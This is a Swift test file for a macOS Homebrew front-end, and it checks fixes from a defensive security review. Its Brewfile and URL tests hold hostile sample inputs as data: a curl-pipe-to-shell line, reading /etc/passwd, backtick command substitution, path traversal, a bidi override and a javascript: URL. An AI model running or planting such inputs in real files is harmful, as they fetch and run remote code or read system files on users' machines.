import AskpassSupport
import Foundation
import Security
import Testing
import TankardCore
@testable import TankardAppModel

// 0.8.8: the defensive security review (scratch/security/tankard-review.md).
// One suite per finding; the core-only ones are in V088SecurityCoreTests.

/// #1: the TANKARD_* test switches are inert in a Developer ID build.
struct V088TestHooksTests {
    @Test func onlyBuildsWithoutATeamIDHonourTheSwitches() {
        #expect(TestHooks.allowed(signing: .adhoc, markerTrusted: false))
        #expect(TestHooks.allowed(signing: .unsigned, markerTrusted: false))
        #expect(!TestHooks.allowed(signing: .team("ABCDE12345"), markerTrusted: false))
        // A signature that can't be read counts as a release (fails closed).
        #expect(!TestHooks.allowed(signing: .unknown, markerTrusted: false))
        // The release-candidate e2e: an administrator's marker file.
        #expect(TestHooks.allowed(signing: .team("ABCDE12345"), markerTrusted: true))
    }

    @Test func signingKindFromTheSignatureInformation() {
        let team = [kSecCodeInfoIdentifier as String: "net.mindtricks.tankard",
                    kSecCodeInfoTeamIdentifier as String: "ABCDE12345"] as [String: Any]
        #expect(TestHooks.signing(info: team) == .team("ABCDE12345"))
        let adhoc = [kSecCodeInfoIdentifier as String: "TankardApp",
                     kSecCodeInfoFlags as String: NSNumber(value: SecCodeSignatureFlags.adhoc.rawValue)] as [String: Any]
        #expect(TestHooks.signing(info: adhoc) == .adhoc)
        #expect(TestHooks.signing(info: [:]) == .unsigned)
        // Signed, no Team ID, not ad-hoc: unknown, so treated as a release.
        #expect(TestHooks.signing(info: [kSecCodeInfoIdentifier as String: "x"]) == .unknown)
    }

    @Test func releaseEnvironmentLosesEveryTankardVariable() {
        let env = ["TANKARD_BREW": "/Users/x/.x/brew", "TANKARD_E2E": "1", "TANKARD_SCRIPT": "/tmp/s",
                   "TANKARD_UPDATE_FEED": "/tmp/f", "TANKARD_SNAPSHOT": "/tmp/p.png", "TANKARD_ASKPASS_SNAPSHOT": "/tmp/a.png",
                   "HOME": "/Users/x", "HOMEBREW_TANKARD_ASKPASS_CONTEXT": "brew upgrade --cask x"]
        let release = TestHooks.filtered(env, allowed: false)
        #expect(release == ["HOME": "/Users/x", "HOMEBREW_TANKARD_ASKPASS_CONTEXT": "brew upgrade --cask x"])
        #expect(TestHooks.filtered(env, allowed: true) == env)
    }

    @Test func markerMustBeRootsAndUnwritableByOthersAllTheWayUp() {
        let marker = TestHooks.markerPath
        let rootDir = TestHooks.FileFacts(kind: .directory, uid: 0, mode: 0o755)
        let rootFile = TestHooks.FileFacts(kind: .file, uid: 0, mode: 0o644)
        func check(_ overrides: [String: TestHooks.FileFacts?]) -> Bool {
            TestHooks.markerTrusted(path: marker) { path in
                if let o = overrides[path] { return o }
                return path == marker ? rootFile : rootDir
            }
        }
        #expect(check([:]))
        #expect(!check([marker: nil]))
        #expect(!check([marker: .init(kind: .file, uid: 501, mode: 0o644)]))
        #expect(!check([marker: .init(kind: .file, uid: 0, mode: 0o666)]))
        #expect(!check([marker: .init(kind: .other, uid: 0, mode: 0o755)])) // a symlink
        #expect(!check(["/Library/Application Support/Tankard": .init(kind: .directory, uid: 501, mode: 0o755)]))
        #expect(!check(["/Library/Application Support": .init(kind: .directory, uid: 0, mode: 0o777)]))
        #expect(!check(["/Library": .init(kind: .other, uid: 0, mode: 0o755)]))
    }

    @Test func appRunsOnlyAStandardBrew() async throws {
        // TANKARD_BREW pointing anywhere else finds no brew at all.
        let deps = AppStore.Dependencies.live(environment: ["TANKARD_BREW": "/Users/x/.x/brew"])
        #expect(throws: BrewClientError.self) { try deps.makeClient() }
        #expect(BrewInstallation.locate(override: "/bin/ls", standardOnly: true) == nil)
        // The CLI keeps its --brew / TANKARD_BREW.
        #expect(BrewInstallation.locate(override: "/bin/ls")?.brewPath == "/bin/ls")
    }
}

/// #2: Check Brewfile… reads plain lines without running the file, and
/// runs brew bundle check only after the "it runs the file's code" question.
@MainActor
struct V088BrewfilePreviewTests {
    @Test func readsOnlyPlainLiteralLines() {
        let text = """
        # dotfiles
        tap "homebrew/bundle"
        tap "acme/tools", "https://git.acme.internal/tools.git"
        brew "jq"
        brew 'git'
        brew("ripgrep")
        brew "postgresql@18", restart_service: :changed, link: false
        brew "vim", args: ["with-lua", "HEAD"]   # editor
        cask "firefox"
        cask "acme/tools/widget"
        mas "Xcode", id: 497799835
        vscode "golang.go"

        """
        let p = BrewfileStaticReader.preview(path: "/x/Brewfile", text: text, quarantined: false)
        #expect(p.notRead.isEmpty)
        #expect(p.names(.tap) == ["homebrew/bundle", "acme/tools"])
        #expect(p.names(.formula) == ["jq", "git", "ripgrep", "postgresql@18", "vim"])
        #expect(p.names(.cask) == ["firefox", "acme/tools/widget"])
        #expect(p.names(.mas) == ["Xcode"])
        #expect(p.names(.vscode) == ["golang.go"])
    }

    @Test func injectionLinesAreShownAsNotReadNeverRun() {
        let lines = [
            #"system "curl https://example.com/x | sh""#,
            #"brew "jq"; system("touch /tmp/pwned")"#,
            ##"brew "#{`id`}""##,
            #"brew "a\"; system(\"x\")""#,
            "brew `whoami`",
            #"brew ENV["PKG"]"#,
            #"brew "jq" if system("x")"#,
            #"brew "jq", args: [`id`]"#,
            ##"brew "jq", args: ["#{x}"]"##,
            #"brew "jq", link: File.read("/etc/passwd")"#,
            #"brew "--force""#,
            #"brew "-v""#,
            #"cask "../../evil""#,
            #"tap "evil/tap", "https://x/y.git", eval("x")"#,
            #"mas "App", id: open("x")"#,
            #"mas "App""#,
            "%x(id)",
            "require 'open3'",
            #"["jq"].each { |f| brew f }"#,
            #"brew("jq"))"#,
            "brew\u{202E}\"jq\"",
        ]
        let p = BrewfileStaticReader.preview(path: "/x/Brewfile", text: lines.joined(separator: "\n"), quarantined: true)
        #expect(p.entries.isEmpty)
        #expect(p.notRead.map(\.number) == Array(1...lines.count))
        #expect(p.quarantined)
        // Shown as text, without control or bidi characters.
        #expect(p.notRead.last?.text.unicodeScalars.contains("\u{202E}") == false)
    }

    @Test func longUnreadLinesAreCut() {
        let p = BrewfileStaticReader.preview(path: "/b", text: "x = \"" + String(repeating: "a", count: 500) + "\"", quarantined: false)
        #expect(p.notRead.first?.text.count == 160)
        #expect(p.notRead.first?.text.hasSuffix("…") == true)
    }

    @Test func previewRunsNothingAndCheckWaitsForConsent() async throws {
        let log = CallLog()
        let brewfile = BrewfileStore()
        brewfile.run = { args in log.add(args); return ProcessResult(exitCode: 0, stdout: Data(), stderr: Data()) }
        brewfile.readFile = { _ in "brew \"jq\"\nsystem \"curl x | sh\"\n" }
        brewfile.quarantined = { _ in true }
        brewfile.preview(path: "/Users/me/Downloads/Brewfile")
        guard case .preview(let p) = brewfile.page else { Issue.record("no preview"); return }
        #expect(p.names(.formula) == ["jq"])
        #expect(p.notRead.map(\.number) == [2])
        brewfile.requestBrewCheck()
        #expect(brewfile.page == .confirmRun(p))
        brewfile.cancelBrewCheck()
        #expect(brewfile.page == .preview(p))
        await brewfile.waitForIdle()
        #expect(log.calls.isEmpty)
        // The question is louder for a downloaded file.
        let loud = BrewfileStore.runWarning(quarantined: true)
        #expect(loud.count == 3)
        #expect(loud[0].contains("downloaded"))
        #expect(BrewfileStore.runWarning(quarantined: false).first?.contains("Ruby program") == true)
    }

    @Test func confirmRunsBrewBundleCheck() async throws {
        var deps = Demo.dependencies(.arm64, pace: 0)
        deps.readBrewfile = { _ in "tap \"hashicorp/tap\"\n" }
        let store = AppStore(deps: deps)
        await store.start()
        store.previewBrewfile(at: "/Users/you/Desktop/Brewfile")
        guard case .preview = store.brewfile.page else { Issue.record("no preview"); return }
        store.confirmBrewfileCheck() // not asked yet: nothing
        guard case .preview = store.brewfile.page else { Issue.record("ran without the question"); return }
        store.brewfile.requestBrewCheck()
        store.confirmBrewfileCheck()
        await store.brewfile.waitForIdle()
        guard case .checked = store.brewfile.page else { Issue.record("no check result: \(store.brewfile.page)"); return }
    }

    @Test func tooLargeOrUnreadableFileIsNotPreviewed() {
        let brewfile = BrewfileStore()
        brewfile.readFile = { _ in nil }
        brewfile.preview(path: "/nonexistent/Brewfile")
        guard case .failed = brewfile.page else { Issue.record("expected failed"); return }
    }

    @Test func quarantineMarkIsRead() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("tankard-q-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let f = dir.appendingPathComponent("Brewfile")
        try Data("brew \"jq\"\n".utf8).write(to: f)
        #expect(!BrewfileStaticReader.isQuarantined(f.path))
        let value = "0081;00000000;Safari;"
        #expect(setxattr(f.path, "com.apple.quarantine", value, value.utf8.count, 0, 0) == 0)
        #expect(BrewfileStaticReader.isQuarantined(f.path))
    }
}

/// #5: Brewfile names that start with "-" never reach brew as options.
struct V088BrewfileNameTests {
    @Test func dashNamesFromBundleCheckAreDropped() {
        let missing = BrewfileParser.missing(["→ Formula --force needs to be installed.",
                                              "→ Cask -v needs to be installed.",
                                              "→ Formula jq needs to be installed.",
                                              "→ Widget --x needs to be installed."])
        #expect(missing == [BrewfileEntry(kind: .formula, name: "jq")])
    }

    @Test func invalidNamesAreTerminalOnlyInThePlan() {
        let plan = BrewfileRestorePlan(missing: [BrewfileEntry(kind: .formula, name: "jq"),
                                                 BrewfileEntry(kind: .formula, name: "a b"),
                                                 BrewfileEntry(kind: .cask, name: "../evil")], path: "/b")
        #expect(plan.queued.map(\.entry.name) == ["jq"])
        #expect(plan.packages().map(\.qualifiedName) == ["jq"])
    }

    @Test func aDashNameIsNeverAnOption() {
        #expect(BrewCommands.installArguments(kind: .formula, qualifiedName: "--force") == ["install", "--formula", "--", "--force"])
        // Ordinary names are unchanged.
        #expect(BrewCommands.installArguments(kind: .cask, qualifiedName: "homebrew/cask/firefox") == ["install", "--cask", "homebrew/cask/firefox"])
        var p = Package.command("x")
        p.kind = .formula
        p.id = "formula:-x"
        p.fullName = "-x"
        #expect(BrewCommands.upgradeArguments(for: p).suffix(2) == ["--", p.qualifiedName])
        #expect(BrewCommands.uninstallArguments(for: p).suffix(2) == ["--", p.qualifiedName])
    }
}

/// #6: Copy as Brewfile can't turn a name into Ruby code.
struct V088RestoreBrewfileTests {
    static func pkg(_ name: String, kind: PackageKind = .formula, tap: String? = nil) -> RestorePointPackage {
        let q = tap.map { "\($0)/\(name)" } ?? name
        return RestorePointPackage(id: "\(kind.rawValue):\(q)", name: name, fullName: q, tap: tap, kind: kind,
                                   version: "1", pinned: false, requested: true)
    }

    @Test func interpolationAndQuotesNeverBecomeCode() {
        let point = RestorePoint(createdAt: Date(), reason: .manual,
                                 packages: [Self.pkg(##"x#{system("x")}"##), Self.pkg(#"a"; system("x"); b""#),
                                            Self.pkg("jq", tap: "homebrew/core"), Self.pkg("firefox", kind: .cask, tap: "homebrew/cask")],
                                 taps: ["homebrew/core", ##"evil/#{system("x")}"##, "user/tools"])
        let text = point.brewfile
        #expect(!text.contains("system"))
        #expect(text == """
        tap "user/tools"
        brew "homebrew/core/jq"
        cask "homebrew/cask/firefox"
        # Tankard left out 3 entries whose names aren't valid Homebrew names.

        """)
        // What the preview reads back from it: the same, nothing unread.
        let back = BrewfileStaticReader.preview(path: "/b", text: text, quarantined: false)
        #expect(back.notRead.isEmpty && back.entries.count == 3)
    }

    @Test func rubyStringEscapesEverythingLive() {
        #expect(RestorePoint.rubyString(##"#{system("x")}"##) == ##""\#{system(\"x\")}""##)
        #expect(RestorePoint.rubyString(#"a\b"#) == #""a\\b""#)
        #expect(RestorePoint.rubyString("jq") == #""jq""#)
    }
}

/// #4: links from package data open only as http(s) web pages.
struct V088WebURLTests {
    @Test func onlyHTTPAndHTTPSWithAHost() {
        #expect(WebURL.from("https://jqlang.org")?.host == "jqlang.org")
        #expect(WebURL.from("http://example.com/x") != nil)
        #expect(WebURL.from("HTTPS://Example.com") != nil)
        for bad in ["file:///opt/homebrew/Library/Taps/x/evil.command", "smb://host/share", "ssh://host",
                    "javascript:alert(1)", "x-apple.systempreferences:com.apple.x", "vnc://h", "ftp://h/x",
                    "https:///nohost", "https:nohost", "/etc/passwd", "", "tel:123"] {
            #expect(WebURL.from(bad) == nil, "\(bad)")
        }
        #expect(WebURL.from(nil) == nil)
        // The context menus use the same rule.
        #expect(ContextMenus.webURL("file:///x") == nil)
        #expect(ContextMenus.webURL("https://x.org") != nil)
    }
}

/// #8: banner text is never Markdown; only `code` spans are styled.
struct V088NoticeTextTests {
    @Test func linksStayTextAndCodeSpansAreStyled() {
        let a = NoticeText.attributed("Couldn't refresh: [click](https://evil.example) run `brew update` <https://x.org>")
        #expect(String(a.characters) == "Couldn't refresh: [click](https://evil.example) run brew update <https://x.org>")
        #expect(a.runs.allSatisfy { $0.link == nil })
        let code = a.runs.filter { $0.inlinePresentationIntent == .code }.map { String(a[$0.range].characters) }
        #expect(code == ["brew update"])
    }

    @Test func anUnpairedBacktickIsShownAsTyped() {
        let a = NoticeText.attributed("a `b` c `d")
        #expect(String(a.characters) == "a b c `d")
    }
}

/// #9: the self-update release link must be https on github.com.
struct V088SelfUpdateLinkTests {
    static func answer(_ url: String) -> Data {
        Data(#"{"tag_name":"v99.0.0","body":"","html_url":"\#(url)","draft":false,"prerelease":false}"#.utf8)
    }

    func page(_ url: String) -> URL? {
        if case .available(let r) = UpdateFeed.result(data: Self.answer(url), status: 200, current: "0.8.8") { return r.url }
        return nil
    }

    @Test func httpOrOtherHostsFallBackToTheReleasesPage() {
        #expect(page("https://github.com/d4rkwyng/tankard/releases/tag/v99.0.0")?.absoluteString
                == "https://github.com/d4rkwyng/tankard/releases/tag/v99.0.0")
        #expect(page("http://github.com/d4rkwyng/tankard/releases/tag/v99.0.0") == UpdateFeed.releasesPage)
        #expect(page("https://evil.example/releases") == UpdateFeed.releasesPage)
        #expect(page("file://github.com/x") == UpdateFeed.releasesPage)
        #expect(UpdateFeed.releasePageOK(URL(string: "https://GitHub.com/x")!))
    }
}

/// #10: Terminal scripts are new, exclusively created 0700 files.
struct V088TerminalScriptTests {
    @Test func eachScriptIsAFreshPrivateFile() throws {
        let base = FileManager.default.temporaryDirectory.appendingPathComponent("tankard-ts-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: base) }
        let a = try TerminalScript.write("#!/bin/bash\necho a\n", name: "uninstall", in: base)
        let b = try TerminalScript.write("#!/bin/bash\necho b\n", name: "uninstall", in: base)
        #expect(a != b)
        #expect(a.lastPathComponent == "tankard-uninstall.command")
        #expect(try String(contentsOf: a, encoding: .utf8) == "#!/bin/bash\necho a\n")
        for url in [a, b] {
            let fileMode = try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? Int
            let dirMode = try FileManager.default.attributesOfItem(atPath: url.deletingLastPathComponent().path)[.posixPermissions] as? Int
            #expect(fileMode == 0o700)
            #expect(dirMode == 0o700)
            #expect(url.deletingLastPathComponent().deletingLastPathComponent().standardizedFileURL.path
                    == base.standardizedFileURL.path)
        }
        // The installer scripts use the same writer.
        let i = try HomebrewInstaller.homebrew.writeScript(in: base)
        #expect(i.deletingLastPathComponent() != a.deletingLastPathComponent())
    }

    @Test func aPlantedFileAtTheOldFixedNameIsNeverFollowed() throws {
        let base = FileManager.default.temporaryDirectory.appendingPathComponent("tankard-ts-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: base, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: base) }
        // Before 0.8.8 the script was always $TMPDIR/tankard-<name>.command.
        let target = base.appendingPathComponent("target")
        try Data("untouched".utf8).write(to: target)
        let planted = base.appendingPathComponent("tankard-uninstall.command")
        try FileManager.default.createSymbolicLink(at: planted, withDestinationURL: target)
        let url = try TerminalScript.write("#!/bin/bash\n", name: "uninstall", in: base)
        #expect(url.standardizedFileURL.path != planted.standardizedFileURL.path)
        #expect(try String(contentsOf: target, encoding: .utf8) == "untouched")
    }
}

/// #3: the password dialog only for the brew Tankard ticketed for a step
/// that may need sudo.
struct V088AskpassTicketTests {
    typealias T = AskpassTicket
    static let start = T.ProcessStart(sec: 1_790_000_000, usec: 123_456)

    func tempDir() throws -> String {
        let d = FileManager.default.temporaryDirectory.appendingPathComponent("tankard-tk-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: d, withIntermediateDirectories: true)
        return d.path
    }

    @Test func ticketTextRoundTripsAndRejectsJunk() {
        let t = T.Ticket(pid: 4242, start: Self.start)
        #expect(T.decode(T.encode(t)) == t)
        for bad in ["", "4242 1 2", "tankard-askpass-ticket 1 4242 1", "tankard-askpass-ticket 2 4242 1 2",
                    "tankard-askpass-ticket 1 1 1 2", "tankard-askpass-ticket 1 -5 1 2",
                    "tankard-askpass-ticket 1 4242 1 1000000", "tankard-askpass-ticket 1 4242 x 2"] {
            #expect(T.decode(bad) == nil, "\(bad)")
        }
    }

    @Test func onlyTheExactProcessAboveSudoMatches() {
        let tickets = [T.Ticket(pid: 500, start: Self.start)]
        // sudo's parent chain: a formula's ruby (600), then the ticketed brew (500), then Tankard (400).
        #expect(T.matches(tickets: tickets, ancestors: [(pid: Int32(600), start: .init(sec: 1, usec: 1)), (pid: Int32(500), start: Self.start), (pid: Int32(400), start: .init(sec: 1, usec: 0))]))
        // Same pid, another process (pid reused): no.
        let reused = T.ProcessStart(sec: Self.start.sec, usec: 0)
        #expect(!T.matches(tickets: tickets, ancestors: [(pid: Int32(500), start: reused)]))
        // Start time unreadable: no.
        #expect(!T.matches(tickets: tickets, ancestors: [(pid: Int32(500), start: nil)]))
        // No ticket (a formula-only step, an auto-update): no.
        #expect(!T.matches(tickets: [], ancestors: [(pid: Int32(500), start: Self.start)]))
    }

    @Test func gateRefusesWithoutAMatchingTicketAndKeepsTheOtherChecks() {
        let helper = "/Applications/Tankard.app/Contents/Helpers/TankardPassword.app/Contents/MacOS/tankard-askpass"
        let tankard = "/Applications/Tankard.app/Contents/MacOS/Tankard"
        let ok = AskpassGate.decide(parentPath: "/usr/bin/sudo", ancestorPaths: ["/bin/bash", tankard], helperPath: helper,
                                    helperTeam: "T", tankardTeam: "T", ticketMatched: true)
        #expect(ok == .allow)
        let noTicket = AskpassGate.decide(parentPath: "/usr/bin/sudo", ancestorPaths: ["/bin/bash", tankard], helperPath: helper,
                                          helperTeam: "T", tankardTeam: "T", ticketMatched: false)
        guard case .deny(let why) = noTicket else { Issue.record("allowed without a ticket"); return }
        #expect(why.contains("ticket"))
        // A ticket doesn't excuse the earlier checks.
        #expect(AskpassGate.decide(parentPath: "/tmp/sudo", ancestorPaths: [tankard], helperPath: helper,
                                   ticketMatched: true) != .allow)
        #expect(AskpassGate.decide(parentPath: "/usr/bin/sudo", ancestorPaths: [tankard], helperPath: helper,
                                   helperTeam: "T", tankardTeam: "X", ticketMatched: true) != .allow)
    }

    @Test func ticketFileIsPrivateAndPrunesStaleOnes() throws {
        let base = try tempDir()
        defer { try? FileManager.default.removeItem(atPath: base) }
        let dir = base + "/askpass-tickets"
        let gone = T.Ticket(pid: 999_999, start: Self.start)
        let gonePath = try #require(T.write(gone, in: dir, isAlive: { _ in true }))
        let t = T.Ticket(pid: 4242, start: Self.start)
        let path = try #require(T.write(t, in: dir, isAlive: { $0 != gone }))
        #expect(!FileManager.default.fileExists(atPath: gonePath))
        let fileMode = try FileManager.default.attributesOfItem(atPath: path)[.posixPermissions] as? Int
        let dirMode = try FileManager.default.attributesOfItem(atPath: dir)[.posixPermissions] as? Int
        #expect(fileMode == 0o600 && dirMode == 0o700)
        #expect(T.read(in: dir) == [t])
    }

    @Test func helperIgnoresTicketsOthersCouldHavePlanted() throws {
        let base = try tempDir()
        defer { try? FileManager.default.removeItem(atPath: base) }
        let dir = base + "/askpass-tickets"
        let t = T.Ticket(pid: 4242, start: Self.start)
        _ = try #require(T.write(t, in: dir, isAlive: { _ in true }))
        // A readable ticket (0644) and a symlinked one are not read.
        let loose = dir + "/5000"
        try T.encode(T.Ticket(pid: 5000, start: Self.start)).write(toFile: loose, atomically: false, encoding: .utf8)
        chmod(loose, 0o644)
        let elsewhere = base + "/planted"
        try T.encode(T.Ticket(pid: 6000, start: Self.start)).write(toFile: elsewhere, atomically: false, encoding: .utf8)
        chmod(elsewhere, 0o600)
        try FileManager.default.createSymbolicLink(atPath: dir + "/6000", withDestinationPath: elsewhere)
        #expect(T.read(in: dir) == [t])
        // A folder others can enter: nothing is read.
        chmod(dir, 0o755)
        #expect(T.read(in: dir).isEmpty)
        // A symlinked folder: nothing is read.
        chmod(dir, 0o700)
        try FileManager.default.createSymbolicLink(atPath: base + "/link", withDestinationPath: dir)
        #expect(T.read(in: base + "/link").isEmpty)
    }

    @Test func issuedOnlyForASudoStepAndRemovedAfter() throws {
        let base = try tempDir()
        defer { try? FileManager.default.removeItem(atPath: base) }
        let dir = base + "/askpass-tickets"
        let me = getpid()
        #expect(T.issue(pid: me, environment: ["HOMEBREW_NO_SUDO": "1"], directory: dir) == nil)
        #expect(T.read(in: dir).isEmpty)
        let revoke = try #require(T.issue(pid: me, environment: [Askpass.askpassKey: "/x/tankard-askpass"], directory: dir))
        let start = try #require(T.processStart(me))
        #expect(T.read(in: dir) == [T.Ticket(pid: me, start: start)])
        #expect(T.matches(tickets: T.read(in: dir), ancestors: [(pid: me, start: T.processStart(me))]))
        revoke()
        #expect(T.read(in: dir).isEmpty)
    }
}
